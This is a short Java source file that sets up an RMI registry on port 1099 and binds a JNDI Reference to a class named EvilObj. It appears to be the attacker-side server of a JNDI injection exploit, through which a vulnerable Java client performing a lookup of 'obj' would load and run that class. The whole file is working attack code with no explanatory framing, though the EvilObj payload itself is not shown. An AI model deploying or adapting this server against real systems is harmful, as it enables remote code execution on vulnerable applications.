package org.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RmiRegistryServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(1099);
        String className = EvilObj.class.getName();
        Reference reference = new Reference(className, className, null);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("obj", referenceWrapper);
    }
}
